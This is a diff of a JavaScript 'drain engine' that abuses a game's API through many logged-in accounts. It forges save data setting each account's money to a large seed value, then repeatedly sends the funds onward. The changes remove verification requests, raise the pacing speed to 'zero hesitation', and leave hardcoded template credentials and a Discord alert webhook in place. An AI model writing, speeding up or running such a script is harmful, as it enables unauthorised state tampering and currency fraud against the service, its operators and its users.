@@ -7,7 +7,7 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const FEE = 50, MIN = 100, SEED = 10095950;
 const TEMPLATE = { u: "IDK6543210", p: "@Temi123" };
 const TARGET_HOURS = parseFloat(process.env.DURATION_HOURS || "0");
-const CONCURRENT_LIMIT = 15; // Kept at optimal 15 for stability under heavy server load
+const CONCURRENT_LIMIT = 15;
 
 const storeDir = './store';
 if (!fs.existsSync(storeDir)) fs.mkdirSync(storeDir);
@@ -87,7 +87,7 @@ async function sendDiscordAlert(message) {
   }
 
   delete clean.owner;
-  console.log("[READY] Fast drain engine online (Optimized & Paced).\n");
+  console.log("[READY] Instant-Drain Turbo Engine Online.\n");
 
   const sessionStart = Date.now();
   let sessionTotalSent = 0, globalCycles = 0;
@@ -118,28 +118,28 @@ async function sendDiscordAlert(message) {
           const svReq = await request(`${API}/save`, {}, accCookie);
           let sv = svReq.res.ok ? await svReq.res.json() : null;
 
+          let ownerId = sv?.game?.owner;
+          let currentMoney = Number(sv?.game?.money ?? 0);
+
+          // If no game state, boot fresh and set money instantly
           if (!sv?.game) {
             const meReq = await request(`${API}/auth/me`, {}, accCookie);
             const me = meReq.res.ok ? await meReq.res.json().catch(() => null) : null;
             if (!me?.user?.id) continue;
+            ownerId = me.user.id;
 
-            const g = { ...clean, sim: { ...clean.sim, name: a.u }, owner: me.user.id, money: SEED };
+            const g = { ...clean, sim: { ...clean.sim, name: a.u }, owner: ownerId, money: SEED };
             const br = await request(`${API}/save`, {
               method: "PUT",
               headers: { "content-type": "application/json" },
-              body: JSON.stringify({ game: g, owner: me.user.id, fresh: true, replace: 0 })
+              body: JSON.stringify({ game: g, owner: ownerId, fresh: true, replace: 0 })
             }, accCookie);
 
-            if (br.res.ok) {
-              await sleep(15);
-              const svRetry = await request(`${API}/save`, {}, accCookie);
-              sv = svRetry.res.ok ? await svRetry.res.json() : null;
-            } else continue;
-          }
-
-          if (!sv?.game) continue;
-
-          if (Number(sv.game.money) < MIN + FEE) {
+            if (!br.res.ok) continue;
+            currentMoney = SEED; // Instantly set without extra GET request
+          } 
+          // If balance is too low, repair and seed instantly
+          else if (currentMoney < MIN + FEE) {
             const g = { ...sv.game, money: SEED };
             const rr = await request(`${API}/save`, {
               method: "PUT",
@@ -147,16 +147,14 @@ async function sendDiscordAlert(message) {
               body: JSON.stringify({ game: g, base: sv.updatedAt ?? sv.now })
             }, accCookie);
 
-            if (rr.res.ok) {
-              await sleep(15);
-              const svRetry = await request(`${API}/save`, {}, accCookie);
-              sv = svRetry.res.ok ? await svRetry.res.json() : null;
-            } else continue;
+            if (!rr.res.ok) continue;
+            currentMoney = SEED; // Instantly set without extra GET request
           }
 
-          let amount = Math.floor(Number(sv.game.money ?? 0)) - FEE;
+          let amount = Math.floor(currentMoney) - FEE;
           if (amount < MIN) continue;
 
+          // Send immediately with zero hesitation
           for (let tries = 0; tries < 3; tries++) {
             const sr = await request(`${API}/send`, {
               method: "POST",
@@ -179,8 +177,8 @@ async function sendDiscordAlert(message) {
             }
           }
 
-          // Micro-pacing to keep connections fluid under 50k user load
-          await sleep(10 + Math.floor(Math.random() * 15));
+          // Ultra-fast micro-pacing
+          await sleep(5 + Math.floor(Math.random() * 10));
         } catch (e) {}
       }
     }
@@ -189,6 +187,6 @@ async function sendDiscordAlert(message) {
     secureShuffle(ledger);
 
     if (global.gc) global.gc();
-    await sleep(500);
+    await sleep(300);
   }
 })();
